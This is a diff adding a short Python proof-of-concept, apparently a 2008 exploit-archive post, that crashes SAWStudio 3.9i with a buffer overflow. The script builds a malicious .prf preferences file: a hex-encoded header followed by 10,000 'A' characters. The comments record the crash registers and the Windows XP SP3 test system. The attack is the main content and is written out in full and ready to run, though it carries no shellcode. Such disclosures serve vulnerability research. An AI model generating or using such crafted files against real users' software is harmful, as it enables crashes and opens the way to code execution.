@@ -1,0 +1,30 @@
+# SAWStudio 3.9i (prf file) Buffer overflow Poc
+# By:Encrypt3d.M!nd
+#
+# Greetz:-=Mizo=-,L!0N,El Mariachi,MiNi SpIder,GGY,and all my friends
+#####################################################################
+#
+# when you import Prefernces File "prf file" contain long characters
+# an overflow will occure,and the registers will be just like this:
+#
+#
+# EAX:41414141 ECX:00000000 EDX:00561498 EBX:00000000
+# ESP:0012DA5C EBP:0012FAD0 ESI:00561498 EDI:00000000
+# EIP:7C91B1FA ntdll.7C91B1FA
+#
+# Access violation when writing to[41414151]
+#
+# Tested on: Windows XP SP3
+#####################################################################
+
+
+
+l337 = ("\x53\x41\x57\x53\x54\x55\x44\x49\x4F\x20\x50\x52\x45\x46\x45\x52\x45\x4E\x43\x45\x53\x20\x53\x54\x52\x55\x43\x54\x20\x20\x20\x20\x20")
+
+pl = "A"*10000
+
+file=open('enc.prf','w+')
+file.write(l337+pl)
+file.close()
+
+# milw0rm.com [2008-12-24]
